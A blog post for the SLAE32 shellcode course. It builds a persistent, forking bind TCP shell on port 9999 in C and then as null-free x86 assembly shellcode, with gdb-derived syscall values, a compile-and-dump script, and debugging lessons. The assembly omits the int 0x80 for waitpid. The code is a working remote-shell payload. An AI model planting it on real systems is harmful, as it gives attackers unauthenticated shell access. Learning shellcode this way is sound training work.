---
layout: page
title: SLAE32 Assignment 1
---

<div class="well" markdown="1">
<h2>SLAE32 Assignment 1: Bind TCP Shell</h2>

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1009

The first assignment requires the implementation of a bind tcp shell. Now I know that typically one of the goals of shellcode is to make it short. However, since this is my first major foray into shellcode, I wanted to learn the most I could and so I opted to try to make the shellcode more full featured instead of small and compact. In thinking about bind shells, one of the main annoying things is that if the shell dies for whatever reason, you have to reexploit the software, as typically bind shells accept only one connection. So for my bind shell, I wanted to make it persist and accept connections repeatedly. As such, I needed to add some multiprocess functionality to the shellcode.

The first step was to write the general code in C to see how the system calls will be laid out. The following is the code I came up with.

```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(){
  char *execargs[] = {"/bin//sh", 0};
  int port = 9999;
  struct sockaddr_in server_sa;
  int sockaddr_size = sizeof(struct sockaddr_in);

  // clear it out
  memset(&server_sa, 0, sizeof(struct sockaddr_in));

  // setup the socket information
  server_sa.sin_family=AF_INET;
  server_sa.sin_port = htons(port);
  server_sa.sin_addr.s_addr = 0x00000000; //INADDR_ANY

  // create the socket
  int serversock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  // bind the socket to the address and port
  bind(serversock, (struct sockaddr *)&server_sa, sockaddr_size);

  // listed for incoming connections
  listen(serversock, 0);

  while(1){
    // accept a new connection
    struct sockaddr_in client_sa;
    int clientsock = accept(serversock, (struct sockaddr *) &client_sa, &sockaddr_size);

    int child = fork();
    if (!child){
        // this is the child
        dup2(clientsock,0);
        dup2(clientsock,1);
        dup2(clientsock,2);
        execve(execargs[0],execargs,0);
    }
    else {
        int status;
        waitpid(child,&status,0);
    }
  }
}
```
So as you can see, the sequence of system calls are `socket`, `bind`, `listen`, `accept`, `fork`, `waitpid` for the parent, and `dup` and `execve` for the child.

At this point I went into /usr/include/i386-linux-gnu/asm/unistd_32.h to find the syscall numbers, and found that the socket calls did not exist. Also, from looking at other bind shellcodes, I could see that there is one syscall for all the networking functions, namely `socketcall`, and the first parameter is the type of socket function that we are requesting. So the next step is to find the numbers for each syscall. We also need to find the values for all the parameters, such as AF_INET and IPPROTO_TCP. So to find all this out, I compiled the c code and stepped through it using gdb and examined the values of the registers before each syscall.

First socket. `socket` takes three integer arguments. In order to do this, I first do a `break _start`, then `run`, then `disassemble __socket`.

{% include image name="socket_disasm.png" width="100%" %}

As you can see there is a call to `DWORD PTR gs:0x10`. Let's step into that function and see what is going on.

{% include image name="socket_syscall.png" width="75%" %}

That is clearly where the syscall is happening, so let's step to the `int 0x80` and see what the registers look like.

{% include image name="socket_syscall_registers.png" width="100%" %}

As we can see, eax has a value of 0x66 (or 102 in decimal). That is the value of the syscall number for socketcall. The socket function is the value in ebx, which is 1. The ecx register contains a pointer to the three values that have been pushed onto the stack, namely 2, 1, and 6. So we have our socket call number, as well as the values for AF_INET, SOCK_STEAM, and IPPROTO_TCP.

Using this same technique, we can examine the contents of the registers at each syscall to make sure we get the appropriate values on the stack and the appropriate values and addresses in the registers. In doing so, we find that the types for the socketcalls are as follows: socket (1), bind (2), listen (4), and accept (5).

Based on this, I was able to create the following nasm code:

```nasm
global _start			

section .text
_start:

  ; Set up the socket
  ; need to call socketcall with args 1, and a pointer to domain (2), type (1), protocol(6)
  xor eax, eax
  mov al, 6 ; protocol = IPPROTO_TCP
  push eax
  mov al, 1 ; type = SOCK_STREAM
  push eax
  mov al, 2 ; domain = AF_INET
  push eax
  mov al, 102 ; syscall - socketcall
  xor ebx,ebx
  mov bl, 1   ; socket sockcall type
  mov ecx, esp ; pointer to the args
  int 0x80

  ; eax now contains the socket file descriptor
  ; save it in esi for later usage
  mov esi,eax

  ; Bind to the socket
  ; need to contruct the sockaddr_in
  ; this is 02 00 27 0f 00 00 00 00 00 00 00 00 00 00 00 00 for port 9999
  xor ebx,ebx
  push ebx ; null padding
  push ebx ; null padding
  push ebx ; INADDR_ANY
  mov ebx, 0x2f27f0f2
  and ebx, 0x0fff0f0f ;get 0x0200270f into ebx without any null bytes in the instructions
  push ebx
  mov ebx, esp ; now ebx has the address of the sockaddr_in struct
  xor ecx,ecx
  mov cl, 16
  push ecx
  push ebx
  push esi
  mov ecx, esp
  xor ebx,ebx
  mov bl, 2 ; bind sockcall type
  xor eax,eax
  mov al, 102 ; syscall - socketcall
  int 0x80

  ; Listen on the socket
  xor eax,eax
  push eax
  push esi
  mov ecx,esp ; pointer to args
  xor ebx,ebx
  mov bl, 4 ; listen sockcall type
  mov al, 102 ; syscall - socketcall
  int 0x80

handle_connections:
  ; accept a connection
  xor eax,eax
  mov al, 16
  push eax ; sockaddr_in length
  mov edx, esp ; store address of sockaddr_len
  sub esp, 16 ; allocate space for client sockaddr
  push edx ; address for sockaddr_len
  sub edx, 16
  push edx ; address for client sockaddr
  push esi ; socket file descriptor
  mov ecx, esp ; pointer to args
  xor ebx,ebx
  mov bl, 5 ; accept sockcall type
  mov al, 102 ; syscall - socketcall
  int 0x80

  ; avoid memory leak and we don't care about the
  ; client sockaddr anyways
  ; also we won't process more than one connection at a time
  ; although we could also use a null and ignore it altogether
  add esp,32

  ; save the clientsocket
  mov edi,eax

  ; fork to process the connection
  xor eax,eax
  mov al, 2
  int 0x80
  xor ebx,ebx ; get a 0 to compare against
  cmp eax,ebx ; compare with zero
  je child ; if fork return a zero, we are in the child process

  ; call waitpid to prevent zombies
  xor edx,edx ; options
  sub esp,4 ; allocate space for return status
  mov ecx,esp
  mov ebx,eax ; child pid
  xor eax,eax
  mov al, 7 ; waitpid syscall
  add esp,4 ; restore stack from child exit status

  ; infinite loop
  jmp handle_connections

child:
  ; duplicate the file descriptors
  mov ebx,edi
  xor ecx,ecx
  xor eax,eax
  mov al, 63 ; dup2 syscall
  int 0x80 ; dup2(clientsock, 0)
  mov al, 63
  inc ecx
  int 0x80 ; dup2(clientsock, 1)
  mov al, 63
  inc ecx
  int 0x80 ; dup2(clientsock, 2)

  ; execve the shell using stack method
  ; let's execute bash
  xor eax,eax
  push eax
  push 0x68736162
  push 0x2f6e6962
  push 0x2f2f2f2f

  mov ebx,esp ; pointer to "////bin/bash"
  push eax
  mov edx,esp ; env pointer (NULL)

  push ebx
  mov ecx,esp ; pointer to [pointer to "////bin/bash", 0]

  mov al, 11 ; execve syscall
  int 0x80
```

I compiled this asm code with a modified version of the compile script given in the course:

```bash
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Dumping shellcode ...'
echo -ne "\""
for s in `objdump -d $1 | grep "^ " | cut -f2`
do
  if [ $s == "00" ]
  then
     echo "Shellcode contains a null byte! Aborting!"
     exit
  else
     echo -n '\x'$s
  fi
done
echo "\""

echo '[+] Done!'
```

This script does the regular compilation, but also spits out the shellcode if it contains no null bytes. So I was able to run the executable file directly to test to make sure it worked.

Running directly results in a successful shell:

{% include image name="itworks.png" width="100%" %}

Pasting the shellcode into the shellcode.c stub file shows us that it works here also!

{% include image name="functional_shellcode.png" width="100%" %}

So it could have been more compact, and I will look to make my future shellcode more compact, but I learned a lot through the process of putting this together.

All necessary code from this assignment can be found [here](https://github.com/mshaneck/SLAE32/tree/master/A1)

<h2>Bonus Lessons Learned</h2>
So to help communicate the process of discovery that one goes through in learning challenging technical concepts, I wanted to share the following story. After deducing the appropriate values for the syscalls and socketcalls and other values, I wrote the assembly code version. I tried it out and it worked great. I then moved to a new machine and planned to do the rest of the assignment and writeups on the new machine, with a new 32 bit virtual machine. When I tested the code on the new vm, it didn't work. I dug a little deeper and realized I had a typo in my assembly code and it was selecting a random port to listen on. I ran it through the debugger on the original machine and saw that it was doing that there also.

So why did I think it worked? The virtual machine that I had used originally I had been using last Spring for some malware analysis and had installed an internet simulator. This internet simulator just happened to be serving a shell on port 9999, which is the (random) port I chose for this bind shellcode. So when I thought I was connecting to the bind shell, I was really connecting to another bind shell that I had forgotten to shut off from the last time I had used that vm. Duh.

The typos I made? One was forgetting about little endian in the integer the contains the socket family and port number. The second was forgetting to zero out the ecx register before putting the sockaddr_in length into it. Once those were fixed, the commands were being sent through the shell, but the results were being printed on the server side. This was due to the fact that I had originally called the dup2 three times in sequence, changing ecx each time but not resetting eax back to the dup2 syscall.

Once I had fixed all of those errors, it worked in the normal executable. However, once I pasted the shellcode into the stub file and ran it from the stack, it would continuously spawn children but no shell.
{% include image name="uhoh.png" width="100%" %}

It didn't take long with the debugger for me to realize that before setting the ebx register for the intial socket call, I hadn't cleared it out, so the `mv bl, 1` was simply changing a value that was already there. In the regular executable, ebx started out as 0, but when running from the stack, it wasn't. Once that was fixed, it worked beautifully.
</div>
